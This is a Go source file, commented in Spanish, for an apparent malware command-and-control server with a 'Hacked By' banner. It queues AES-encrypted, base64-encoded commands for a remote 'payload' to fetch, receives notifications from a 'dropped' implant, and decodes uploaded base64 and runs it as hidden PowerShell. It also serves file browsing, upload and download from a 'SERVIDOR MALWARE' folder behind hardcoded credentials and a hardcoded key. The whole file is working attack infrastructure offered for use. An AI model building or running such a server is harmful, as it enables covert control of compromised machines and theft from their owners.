package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/term"
)

// Credenciales de login
var username = "jonnhym"
var password = "pawned"
var aesKey = "mysecretpassword"

// Variable para almacenar el último comando cifrado
var latestEncryptedCommand string

// Función para manejar errores
func checkError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

// Función para cifrar un texto usando AES
func encryptAES(text, key string) string {
	block, err := aes.NewCipher([]byte(key))
	checkError(err)

	ciphertext := make([]byte, aes.BlockSize+len(text))
	iv := ciphertext[:aes.BlockSize]

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], []byte(text))

	return hex.EncodeToString(ciphertext)
}

// Función para decodificar base64
func decodeBase64(encoded string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	return decoded, nil
}

// Función para ejecutar un script de PowerShell en memoria de forma oculta
func executePowershellScript(script string) {
	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command", script)

	err := cmd.Start()
	checkError(err)
	fmt.Println("Script PowerShell ejecutado en segundo plano.")
}

// Función para manejar la recepción de comandos cifrados y almacenarlos
func handleCommand(w http.ResponseWriter, r *http.Request) {
	// Leer el comando desde el cuerpo de la solicitud HTTP
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Error leyendo el comando", http.StatusInternalServerError)
		return
	}

	comando := string(body)
	fmt.Println("Comando recibido:", comando)

	// Codificar el comando en Base64
	encodedCommand := base64.StdEncoding.EncodeToString([]byte(comando))

	// Cifrar el comando codificado
	encryptedCommand := encryptAES(encodedCommand, aesKey)
	fmt.Println("Comando cifrado enviado:", encryptedCommand)

	// Almacenar el comando cifrado para que el payload lo recoja
	latestEncryptedCommand = encryptedCommand

	fmt.Fprintf(w, "Comando cifrado almacenado para el payload: %s", encryptedCommand)
}

// Función para enviar el último comando cifrado al payload
func sendEncryptedCommandToPayload(w http.ResponseWriter, r *http.Request) {
	if latestEncryptedCommand == "" {
		http.Error(w, "No hay comandos disponibles", http.StatusNotFound)
		return
	}

	// Enviar el último comando cifrado al payload
	fmt.Fprintln(w, latestEncryptedCommand)
	fmt.Println("Comando cifrado enviado al payload:", latestEncryptedCommand)
}

// Función para recibir un archivo en base64, decodificarlo y ejecutar el script PowerShell en memoria
func handleFileUpload(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	checkError(err)

	decodedFile, err := decodeBase64(string(body))
	checkError(err)

	executePowershellScript(string(decodedFile))

	fmt.Fprintf(w, "Archivo decodificado y ejecutado en PowerShell.")
}

// Función para manejar la notificación del dropped
func handleNotify(w http.ResponseWriter, r *http.Request) {
	status := r.URL.Query().Get("status")
	fmt.Println("Notificación recibida del dropped: ", status)
	fmt.Fprintf(w, "Notificación recibida: %s", status)
}

// Autenticación en CLI con ocultación de contraseña
func cliLogin() bool {
	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Usuario: ")
	inputUser, _ := reader.ReadString('\n')
	inputUser = strings.TrimSpace(inputUser)

	fmt.Print("Contraseña: ")
	bytePassword, err := term.ReadPassword(int(syscall.Stdin))
	if err != nil {
		fmt.Println("\nError leyendo la contraseña:", err)
		return false
	}
	inputPass := strings.TrimSpace(string(bytePassword))
	fmt.Println()

	if inputUser == username && inputPass == password {
		fmt.Printf("Ingreso exitoso. Bienvenido, %s.\n", inputUser)
		return true
	}

	fmt.Println("Credenciales incorrectas. Acceso denegado.")
	return false
}

// Función para listar archivos y carpetas en el servidor y permitir la navegación
func listFilesInDirectory(currentDir string) []string {
	var files []string
	err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		files = append(files, path)
		return nil
	})
	checkError(err)
	return files
}

// Función para manejar la visualización de archivos y navegación por directorios a través de la web
func handleDirectoryListing(w http.ResponseWriter, r *http.Request) {
	dir := r.URL.Query().Get("dir")
	if dir == "" {
		dir = "./SERVIDOR MALWARE" // Carpeta raíz
	}

	files := listFilesInDirectory(dir)

	fmt.Fprintln(w, "<html><body><h1>Archivos en el servidor</h1><ul>")
	for _, file := range files {
		relativePath := strings.TrimPrefix(file, dir+"/")
		// Si es un directorio, se permite la navegación
		if info, err := os.Stat(file); err == nil && info.IsDir() {
			fmt.Fprintf(w, "<li><a href=\"/list?dir=%s\">%s</a></li>", filepath.Join(dir, relativePath), relativePath)
		} else {
			// Enlace para descargar el archivo
			fmt.Fprintf(w, "<li><a href=\"/download?file=%s\">%s</a></li>", relativePath, relativePath)
		}
	}
	fmt.Fprintln(w, "</ul><br><br>")
	fmt.Fprintln(w, `<form action="/upload" method="post" enctype="multipart/form-data">
						<label for="file">Subir archivo:</label>
						<input type="file" id="file" name="file">
						<input type="submit" value="Subir">
					</form></body></html>`)
}

// Función para manejar la descarga o visualización de archivos
func handleFileDownload(w http.ResponseWriter, r *http.Request) {
	fileName := r.URL.Query().Get("file")
	if fileName == "" {
		http.Error(w, "Archivo no especificado.", http.StatusBadRequest)
		return
	}

	filePath := filepath.Join("SERVIDOR MALWARE", fileName)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		http.Error(w, "Archivo no encontrado.", http.StatusNotFound)
		return
	}

	http.ServeFile(w, r, filePath)
}

// Función para manejar la subida de archivos en la carpeta 'upload'
func handleUpload(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		r.ParseMultipartForm(10 << 20)

		file, handler, err := r.FormFile("file")
		checkError(err)
		defer file.Close()

		// Guardar el archivo en la carpeta "upload"
		dst, err := os.Create(filepath.Join("SERVIDOR MALWARE/upload", handler.Filename))
		checkError(err)
		defer dst.Close()

		_, err = io.Copy(dst, file)
		checkError(err)

		fmt.Fprintf(w, "Archivo subido exitosamente: %s", handler.Filename)
	} else {
		http.Error(w, "Método no permitido", http.StatusMethodNotAllowed)
	}
}

// Función para manejar el login web
func handleWebLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method == "GET" {
		http.ServeFile(w, r, "login.html")
	} else if r.Method == "POST" {
		user := r.FormValue("username")
		pass := r.FormValue("password")

		if user == username && pass == password {
			http.Redirect(w, r, "/list", http.StatusSeeOther)
		} else {
			http.Error(w, "Credenciales incorrectas", http.StatusUnauthorized)
		}
	}
}

func main() {
	if !cliLogin() {
		return
	}

	showBanner()

	// Ajuste de rutas
	http.HandleFunc("/", handleWebLogin)                          // Ruta para el login web
	http.HandleFunc("/list", handleDirectoryListing)              // Ruta para listar archivos y navegar directorios
	http.HandleFunc("/download", handleFileDownload)              // Ruta para descargar o visualizar archivos
	http.HandleFunc("/upload", handleUpload)                      // Ruta para subir archivos
	http.HandleFunc("/notify", handleNotify)                      // Notificaciones
	http.HandleFunc("/commands", handleCommand)                   // Comandos cifrados
	http.HandleFunc("/getcommand", sendEncryptedCommandToPayload) // Ruta para que el payload obtenga el último comando cifrado

	fmt.Println("Servidor escuchando en el puerto 9090...")
	err := http.ListenAndServe(":9090", nil)
	checkError(err)
}

// Función para mostrar el banner
func showBanner() {
	fmt.Println(`
    __  __           __            __   ____       
   / / / /___ ______/ /_____  ____/ /  / __ )__  __
  / /_/ / __  / ___/ //_/ _ \/ __  /  / __  / / / /
 / __  / /_/ / /__/ ,< /  __/ /_/ /  / /_/ / /_/ / 
/_/ /_/\__,_/\___/_/|_|\___/\__,_/  /_____/\__, /  
      / /___  ____  ____  / /_  __  ______/____/   
 __  / / __ \/ __ \/ __ \/ __ \/ / / / __  __ \    
/ /_/ / /_/ / / / / / / / / / / /_/ / / / / / /    
\____/\____/_/ /_/_/ /_/_/ /_/ \____/__/ /_/ /_/     
                             /____/                
`)
}
